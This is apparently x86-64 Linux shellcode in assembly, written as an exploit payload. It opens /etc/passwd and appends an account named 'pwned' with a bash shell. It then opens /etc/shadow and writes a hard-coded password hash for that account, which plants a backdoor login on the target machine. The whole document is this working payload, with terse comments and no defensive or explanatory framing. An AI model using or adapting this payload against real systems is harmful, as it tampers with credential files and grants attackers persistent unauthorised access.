global _start

_start:

	xor rsi, rsi				;null rsi
	mul rsi					;null rax and rdx using mul
        push 0x2
	pop rax
       mov rdi , 0x647773ffffffffff
	shr rdi, 0x28
       push rdi                                       ; "/etc/passwd"
       mov rdi , 0x7361702f6374652f
       push rdi
       mov rdi , rsp
       add si , 0x441
       add dx , 0x284
       syscall                                        ; open syscall

	push 0x3
	pop rdi

jmp short findaddress                                   ; I placed the jmp short here size of code is too lenght for jmp short if placed in head 

_respawn:

       pop r9
       mov  [r9 + 0x30] , byte 0xa                     ; terminate the string 
       lea rsi , [r9]   ; "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash'    
	push 0x1
	pop rax
	push 0x31
	pop rdx
       syscall                                         ; write syscall

	push 0x3
	pop rdi
       push rdi                                  
	pop rax
       syscall                                         ; close syscall

	xor rsi, rsi
	mul rsi
	push 0x2
	pop rax
       mov rdi , 0x776f64ffffffffff                   ; open '/etc/shadow'
       shr rdi , 0x28
       push rdi
       mov rdi , 0x6168732f6374652f
       push rdi
       mov rdi , rsp
	xor rsi, rsi
	push rsi
	pop rdx
	add si, 0x441
	add dx, 0x284
       syscall                                       ; open syscall


       xor rax , rax
	push rax
	pop rdi
	push 0x1
	pop rax
	push 0x3
	pop rdi
       lea rsi , [r9 + 0x31]                      ;  "pwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::", 0xa
	mov rdx, rax
       add dl , 0x83
       syscall                                    ; write syscall 

	push 0x3
	pop rdi
       push rdi
       pop rax
       syscall




	push 0x3c
	pop rax
					 ;   exit (no matter value of exit code)
       syscall


     findaddress:
        call _respawn
        string : db "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bashApwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::",0xa


